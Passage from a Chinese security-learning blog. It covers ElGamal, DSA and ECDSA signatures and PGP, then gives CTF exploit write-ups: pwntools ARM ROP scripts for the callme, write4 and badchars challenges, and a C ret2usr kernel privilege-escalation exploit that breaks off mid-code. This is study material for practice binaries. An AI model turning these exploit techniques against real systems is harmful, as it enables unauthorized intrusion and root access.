<li>第二种方案：先加密后签名——$z&#x3D;e_{Bob}(x),y&#x3D;sig_{Alice}(z)$</li>
<li>第二种方案可能存在伪造签名混淆发送者的问题，因此采用第一种方案更好。</li>
</ul>
<p><strong>ElGamal签名方案</strong>：<br>设p为一个大素数，使得$(Z_p^*, \cdot)$上的离散对数问题难解。令$\alpha\in Z_p^*$是一个本原元，令$P&#x3D;Z_p^*,A&#x3D;Z_p^<em>\times Z_{p-1}$，定义$K&#x3D;{(p,\alpha,a,\beta):\beta&#x3D;\alpha^a\mod p}$<br>其中$p,\alpha,\beta$为公钥，$a$为私钥<br>对$k&#x3D;(p,\alpha,a,\beta)$以及一个秘密的随机数$r\in Z_{p-1}^</em>$，定义$sig_k(x,r)&#x3D;(\gamma,\delta)$<br>其中$\gamma&#x3D;\alpha^r\mod p,\delta&#x3D;(x-a\gamma)r^{-1}\mod p-1$<br>对于$x,\gamma\in Z_p^*,\delta\in Z_{p-1}$<br>定义$ver(x,(y,\delta))&#x3D;true\Leftrightarrow \beta^\gamma\gamma^\delta\equiv\alpha^x\mod p$<br>容易证明$\beta^\gamma\gamma^\delta\equiv\alpha^{a\gamma+r(x-a\gamma)r^{-1}\mod p-1}\equiv\alpha^x\mod p$</p>
<h2 id="数字签名标准"><a href="#数字签名标准" class="headerlink" title="数字签名标准"></a>数字签名标准</h2><p>DSA算法，签名比验证快很多，不能加密和密钥分配，专用于数字签名，比RSA慢<br>设p是一个大素数，使得$(Z_p^*, \cdot)$上的离散对数问题难解。令$\alpha\in Z_p^*$是一个q阶元素（q为素数），$&lt;\alpha&gt;$上的离散对数问题也难解。（整数k与p-1互素，k∈[0, p-2]，q|p-1）</p>
<p>$$\gamma&#x3D;\alpha^k\mod p,\delta&#x3D;(x+a\gamma)k^{-1}\mod p-1(k\in Z_{p-1}^*)\<br>\because k\delta\equiv x+a\gamma\mod p-1,\therefore\alpha^{k\delta}\equiv\alpha^{x+a\gamma}\mod p\<br>\Rightarrow\alpha^x\beta^\gamma\equiv\gamma^\delta\mod p,\delta&#x3D;(x+a\gamma)k^{-1}\mod q\<br>\gamma’&#x3D;\gamma\mod q&#x3D;(\alpha^k\mod p)\mod q,\delta&#x3D;(x+a\gamma’)k^{-1}\mod q\<br>\alpha^x\beta^{\gamma’}\equiv\gamma^\delta\mod p\<br>\gamma&#x3D;(\alpha^x\beta^{\gamma’})^{\delta^{-1}\mod q}\mod p\Rightarrow \gamma&#x3D;<br>(\alpha^{x\delta^{-1}\mod q}\beta^{\gamma’\delta^{-1}\mod q}\mod p)\mod q&#x3D;\gamma’$$<br>验证$\gamma&#x3D;<br>(\alpha^{x\delta^{-1}\mod q}\beta^{\gamma’\delta^{-1}\mod q}\mod p)\mod q&#x3D;\gamma’$是否成立。成立则数字签名有效。</p>
<p>$$sig_K(x,k)&#x3D;(\gamma, \delta), \gamma&#x3D;(\alpha^k\mod p)\mod q,\delta&#x3D;(\operatorname {SHA-1}(x)+a\gamma)k^{-1}\mod q\<br>e_1&#x3D;\operatorname {SHA-1}(x)\delta^{-1}\mod q,e_2&#x3D;\gamma\delta^{-1}\mod q\<br>ver_K(x,(\gamma,\delta))&#x3D;true\Leftrightarrow(\alpha^{e_1}\beta^{e_2}\mod p)\mod q&#x3D;\gamma$$</p>
<h3 id="椭圆曲线数字签名"><a href="#椭圆曲线数字签名" class="headerlink" title="椭圆曲线数字签名"></a>椭圆曲线数字签名</h3><p>p是一个大素数，E定义在F<del>p</del>上的椭圆曲线。设A是E上阶为q（素数）的一个点，使得在&lt;A&gt;上的离散对数问题是难处理的。设P&#x3D;{0,1}*，A&#x3D;Z<del>q</del>*×Z<del>q</del>*，定义K&#x3D;{(p,q,E,A,m,B): B&#x3D;mA}<br>其中0≤m≤q-1，值p,q,E,A,B为公钥，m为私钥。<br>对于K和一个秘密的随机数k，1≤k≤q-1，定义<br>$$sig_K(x,k)&#x3D;(r,s)$$<br>其中</p>
<h2 id="PGP安全协议"><a href="#PGP安全协议" class="headerlink" title="PGP安全协议"></a>PGP安全协议</h2><p>一种以用户为中心的可提供机密性和鉴别的安全协议。<br><img src="https://img-blog.csdnimg.cn/a98b1c862cd94c579ebe7801e9819470.jpeg"><br>若需要签名和加密，则先签名再加密，如需压缩则加密后压缩：$Z(Sig(H(M),kR_a)||M)$</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">ARM pwn 入门 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:15" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:15+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="3-callme"><a href="#3-callme" class="headerlink" title="3. callme"></a><font face=汉仪唐美人>3. callme</font></h1><p><font face=汉仪唐美人>本题有多个文件，根据题意来看是需要依次调用<code>callme_one</code>、<code>callme_two</code>、<code>callme_three</code>这3个库函数。这三个函数会进行flag的解密，但是需要满足前三个参数等于特定值。这就需要我们去elf文件中寻找合适的gadget了。</font></p>
<p><img src="https://img-blog.csdnimg.cn/f794d1d4548f4bbabf06a989ec5a3896.png"></p>
<p><font face=汉仪唐美人>而本题正好给出了一个不能再合适的gadget，因为本题的考点就在这里：</font></p>
<p><img src="https://img-blog.csdnimg.cn/2eba76ed63c542939bb5c78f86863d56.png"></p>
<p><font face=汉仪唐美人>因此思路就很简单了，直接重复调用这个gadget修改前3个寄存器的值，再分别调用三个callme函数即可。</font></p>
<p><font face=汉仪唐美人>这里需要注意的是，elf文件中虽然给出了一个可以调用3个库函数的函数，能够填充got表，但由于ROP只能写入已知地址，如果写入的是got表的地址，那么程序就会将got表地址当做指令地址来执行，这显然是不对的，少了一层解引用。因此我们需要使用plt表进行利用。和x86架构下的利用相同，如果要使用plt表进行利用，需要注意返回地址的设置。<font color=red>如果plt地址卸载栈上地址值为a的地方，ROP到此，返回地址应该为a-8，且返回后SP指向a+8处</font>。因此，我们需要在<code>callme_one</code>函数的plt地址前面写下一个ROP导向地址。</font></p>
<p><font face=汉仪唐美人>因此我们可以直接在这里写<code>useful_gadget</code>的地址，在<code>callme_one</code>后面直接写三个参数，然后再调用下一个库函数，以此类推。</font></p>
<p><font face=汉仪唐美人>exp：</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;qemu-arm-static&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabi&#x27;, &#x27;-g&#x27;, &#x27;9999&#x27;, &#x27;./callme_armv5&#x27;])</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./callme_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">useful_gadget = <span class="number">0x10870</span></span><br><span class="line">pop_out = <span class="number">0x108dc</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x24</span>)</span><br><span class="line">payload += p32(useful_gadget)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(useful_gadget) + p32(elf.plt[<span class="string">&#x27;callme_one&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(useful_gadget) + p32(elf.plt[<span class="string">&#x27;callme_two&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(pop_out) + p32(elf.plt[<span class="string">&#x27;callme_three&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/49ca344a36e745089c4ee59d2a51d6c9.png"></p>
<h1 id="4-write4"><a href="#4-write4" class="headerlink" title="4. write4"></a><font face=汉仪唐美人>4. write4</font></h1><p><font face=汉仪唐美人>本题的pwnme和print_file函数都写在了库函数中，但观察elf文件可以发现有两个gadget：</font></p>
<p><img src="https://img-blog.csdnimg.cn/af54c37e7cb64d6c8d89abb02b614809.png"></p>
<p><font face=汉仪唐美人>其中第一个为任一地址写指令，第二个可以用作ROP的gadget。考虑到print_file函数需要传入一个字符串参数作为打开的文件，我们需要将flag.txt写到一个特定的地方，然后使用第二个gadget即可传参。</font></p>
<p><img src="https://img-blog.csdnimg.cn/8d2afe1c39484468ae0d98b38de0b8ff.png"></p>
<p><font face=汉仪唐美人>和x86的本题不同，这里的bss段太小，无法写入，因此尝试写入到data段。</font></p>
<p><img src="https://img-blog.csdnimg.cn/b6727b5af7594cc2bb8da256d8ebcadb.png"></p>
<p><font face=汉仪唐美人>exp：</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./write4_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./write4_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">write_addr = <span class="number">0x21024</span></span><br><span class="line">write_gadget = <span class="number">0x105ec</span></span><br><span class="line">pop_r0pc = <span class="number">0x105f4</span></span><br><span class="line">pop_r3r4pc = <span class="number">0x105f0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x24</span>)</span><br><span class="line">payload += p32(pop_r3r4pc) + <span class="string">b&#x27;flag&#x27;</span> + p32(write_addr)</span><br><span class="line">payload += p32(write_gadget) + <span class="string">b&#x27;.txt&#x27;</span> + p32(write_addr + <span class="number">4</span>);</span><br><span class="line">payload += p32(write_gadget) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p32(pop_r0pc) + p32(write_addr) + p32(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/d65b16df2426438cac5d0091f66d4cc7.png"></p>
<h1 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5. badchars"></a><font face=汉仪唐美人>5. badchars</font></h1><p><font face=汉仪唐美人>本题的pwnme中栈溢出过滤了4个字符：x、g、a、.，因此需要利用elf中的gadget。我们看一下都有什么gadget。</font></p>
<p><img src="https://img-blog.csdnimg.cn/3396d40910794657b163d7afe0983a96.png"></p>
<p><font face=汉仪唐美人>第一段gadget：[R5]&#x3D;[R5]-R6; 赋值R0</font><br><font face=汉仪唐美人>第二段gadget：[R5]&#x3D;[R5]+R6; 赋值R0</font><br><font face=汉仪唐美人>第三段gadget：[R4]&#x3D;R3; 赋值R5和R6</font><br><font face=汉仪唐美人>第四段gadget：[R5]&#x3D;[R5]^R6; 赋值R0</font></p>
<p><font face=汉仪唐美人>看到了异或操作，我们可以利用这个异或操作在数据区构造出来关键字符。这里的加法、减法和异或操作实际上只需要一个就可以了。我们将字符串写在和上一道题相同的位置。</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./badchars_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./badchars_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x105f0</span>, <span class="number">0x10600</span>, <span class="number">0x10610</span>, <span class="number">0x10618</span>]</span><br><span class="line">write_addr = <span class="number">0x21024</span></span><br><span class="line"></span><br><span class="line">payload = p32(write_addr + <span class="number">12</span>) * (<span class="number">0x2c</span> // <span class="number">4</span>)	<span class="comment"># 这里要写一个有效地址，不然STR R3, [R4]会报错</span></span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr) + <span class="string">b&#x27;fl&#x27;</span> + p8(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) ^ <span class="number">0xFF</span>) + p8(<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>) ^ <span class="number">0xFF</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">1</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr) + p32(<span class="number">0xFFFF0000</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr + <span class="number">4</span>) + p8(<span class="built_in">ord</span>(<span class="string">&#x27;.&#x27;</span>) ^ <span class="number">0xFF</span>) + <span class="string">b&#x27;t&#x27;</span> + p8(<span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>) ^ <span class="number">0xFF</span>) + <span class="string">b&#x27;t&#x27;</span></span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr + <span class="number">4</span>) + p32(<span class="number">0xFF00FF</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(write_addr)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/aa202fbd09d9472fb65bbfc4893ffb58.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">Kernel Pwn 入门 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:14" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:14+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h1><p>在上一篇文章中，我们借助一道kernel pwn的入门题——core完成了kernel ROP的学习，本系列按照<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9A%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core-1">与上一篇文章相同的资料</a>的顺序继续学习与复现。本篇文章学习的漏洞技术为：ret2usr</p>
<p>仍然使用上一篇文章的例题，没有开启SMAP&#x2F;SMEP，有从内核直接执行用户空间代码的可能性。我们已经知道在本题中能够很容易地获取到两个关键函数的地址，我们在用户态写一个调用提权函数的代码片段，但是不在用户态执行，而是将其插入到ROP链中由内核来执行，与上一题的效果是相同的。只需要对上一题的代码进行一些部分修改即可。</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;	<span class="comment">// address of to key function</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds_base = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> iretq = <span class="number">0xFFFFFFFF81A00987</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;	<span class="comment">// file pointer of process &#x27;core&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">int</span> off)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> nbytes)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rise_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">int</span> off)</span>&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> nbytes)</span>&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889A</span>, nbytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This function is used to get the addresses of two key functions from /tmp/kallsyms</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>&#123;</span><br><span class="line">	FILE* sym_table = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);	<span class="comment">// including all address of kernel functions</span></span><br><span class="line">	<span class="keyword">if</span>(sym_table == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> type[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">char</span> func_name[<span class="number">0x100</span>];</span><br><span class="line">	<span class="comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;</span><br><span class="line">		<span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)		<span class="comment">// two addresses of key functions are all found, return directly.</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;commit_creds&quot;</span>))&#123;		<span class="comment">// function &quot;commit_creds&quot; found</span></span><br><span class="line">			commit_creds = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;prepare_kernel_cred&quot;</span>))&#123;</span><br><span class="line">			prepare_kernel_cred = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span 